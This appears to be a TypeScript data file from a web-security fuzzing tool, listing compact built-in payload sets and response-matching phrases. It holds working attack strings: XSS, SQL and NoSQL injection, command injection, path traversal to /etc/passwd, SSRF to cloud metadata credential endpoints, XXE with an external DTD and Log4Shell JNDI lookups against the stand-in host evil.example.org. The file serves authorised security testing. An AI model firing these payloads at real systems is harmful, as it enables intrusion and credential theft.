// Curated, frozen payload sets shipped in-repo (auditable, offline). These are the
// day-to-day fuzzing lists the Intruder loads; the operator's own lists live in
// the payload_sets table. Kept deliberately compact and high-signal — a handful of
// proven payloads per class, not an exhaustive dump.

export interface PayloadSet {
  id: string
  name: string
  category: string
  payloads: string[]
}

export const BUILTIN_PAYLOAD_SETS: readonly PayloadSet[] = [
  {
    id: 'xss-polyglots',
    name: 'XSS polyglots',
    category: 'xss',
    payloads: [
      `'"><svg/onload=confirm(1)>`,
      `"><img src=x onerror=confirm(1)>`,
      `javascript:confirm(1)`,
      `'"><script>confirm(1)</script>`,
      `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=confirm() )//`,
      `<svg><animate onbegin=confirm(1) attributeName=x dur=1s>`,
    ],
  },
  {
    id: 'sqli-error',
    name: 'SQLi (error-based probes)',
    category: 'sqli',
    payloads: [`'`, `"`, `')`, `';`, `' OR '1'='1`, `' OR 1=1-- -`, `1' AND SLEEP(3)-- -`, `" OR ""="`, `') OR ('1'='1`],
  },
  {
    id: 'sqli-auth-bypass',
    name: 'SQLi auth bypass',
    category: 'sqli',
    payloads: [`admin'-- -`, `admin' #`, `' OR 1=1 LIMIT 1-- -`, `') OR ('a'='a`, `" OR 1=1-- -`],
  },
  {
    id: 'ssti',
    name: 'SSTI markers',
    category: 'ssti',
    payloads: [`{{7*7}}`, `\${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `{{7*'7'}}`, `\${{7*7}}`, `#{ 7*7 }`, `*{7*7}`],
  },
  {
    id: 'lfi',
    name: 'LFI / path traversal',
    category: 'lfi',
    payloads: [
      `../../../../etc/passwd`,
      `....//....//....//etc/passwd`,
      `..%2f..%2f..%2f..%2fetc%2fpasswd`,
      `/etc/passwd`,
      `..\\..\\..\\..\\windows\\win.ini`,
      `php://filter/convert.base64-encode/resource=index.php`,
    ],
  },
  {
    id: 'cmd-injection',
    name: 'Command injection',
    category: 'cmdi',
    payloads: [`; id`, `| id`, `|| id`, `& whoami`, `\`id\``, `$(id)`, `; sleep 3`, `%0a id`, `\n id`],
  },
  {
    id: 'ssrf',
    name: 'SSRF targets',
    category: 'ssrf',
    payloads: [
      `http://169.254.169.254/latest/meta-data/`,
      `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
      `http://127.0.0.1:80/`,
      `http://localhost/`,
      `http://[::1]/`,
      `http://169.254.169.254/`,
      `http://metadata.google.internal/computeMetadata/v1/`, // needs header Metadata-Flavor: Google
      `http://169.254.169.254/metadata/instance?api-version=2021-02-01`, // Azure IMDS — needs header Metadata: true
    ],
  },
  {
    id: 'xxe',
    name: 'XXE (XML external entity)',
    category: 'xxe',
    payloads: [
      `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
      `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`,
      `<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil.example.org/x.dtd"> %p;]>`,
    ],
  },
  {
    id: 'crlf',
    name: 'CRLF / header injection',
    category: 'crlf',
    payloads: [`%0d%0aSet-Cookie:crlf=1`, `%0d%0aX-Injected:crlf`, `%0aSet-Cookie:crlf=1`, `%E5%98%8A%E5%98%8DSet-Cookie:crlf=1`, `%23%0d%0aSet-Cookie:crlf=1`],
  },
  {
    id: 'log4shell',
    name: 'Log4Shell / JNDI',
    category: 'jndi',
    payloads: [
      `\${jndi:ldap://evil.example.org/a}`,
      `\${jndi:dns://evil.example.org/a}`,
      `\${jndi:rmi://evil.example.org/a}`,
      `\${\${lower:j}ndi:\${lower:l}dap://evil.example.org/a}`,
      `\${jndi:ldap://127.0.0.1#evil.example.org/a}`,
    ],
  },
  {
    id: 'mass-assignment',
    name: 'Mass-assignment fields',
    category: 'mass-assignment',
    payloads: [`is_admin`, `isAdmin`, `admin`, `role`, `roles`, `is_staff`, `is_superuser`, `verified`, `is_verified`, `active`, `enabled`, `approved`, `owner_id`, `account_id`, `permissions`, `balance`, `price`, `discount`],
  },
  {
    id: 'prototype-pollution',
    name: 'Prototype pollution',
    category: 'proto',
    payloads: [`__proto__[polluted]=1`, `__proto__.polluted=1`, `constructor[prototype][polluted]=1`, `constructor.prototype.polluted=1`, `{"__proto__":{"polluted":true}}`, `{"constructor":{"prototype":{"polluted":true}}}`],
  },
  {
    id: 'nosqli',
    name: 'NoSQL injection',
    category: 'nosqli',
    payloads: [`' || '1'=='1`, `[$ne]=1`, `{"$gt":""}`, `{"$ne":null}`, `';return true;var x='`, `[$regex]=.*`],
  },
  {
    id: 'open-redirect',
    name: 'Open redirect',
    category: 'redirect',
    payloads: [`//evil.example.org`, `/\\evil.example.org`, `https://evil.example.org`, `%2f%2fevil.example.org`, `https:evil.example.org`],
  },
]

// Canned response signatures to pair with fuzzing — grep-match these in responses
// to spot injection tells (SQL errors, stack traces, template output like 49).
export interface GrepPhraseSet {
  id: string
  name: string
  phrases: string[]
}

export const BUILTIN_GREP_PHRASES: readonly GrepPhraseSet[] = [
  {
    id: 'sql-errors',
    name: 'SQL error strings',
    phrases: ['SQL syntax', 'mysql_fetch', 'ORA-01756', 'PostgreSQL', 'SQLite/JDBCDriver', 'Unclosed quotation mark', 'quoted string not properly terminated'],
  },
  { id: 'stack-traces', name: 'Stack traces / debug', phrases: ['Traceback (most recent call last)', 'Warning: ', 'Fatal error', 'Exception in thread', 'at java.', '.php on line'] },
  { id: 'ssti-eval', name: 'SSTI evaluated output', phrases: ['49', '1592367'] },
  { id: 'lfi-passwd', name: 'LFI success', phrases: ['root:x:0:0:', '[extensions]', 'for 16-bit app support'] },
]
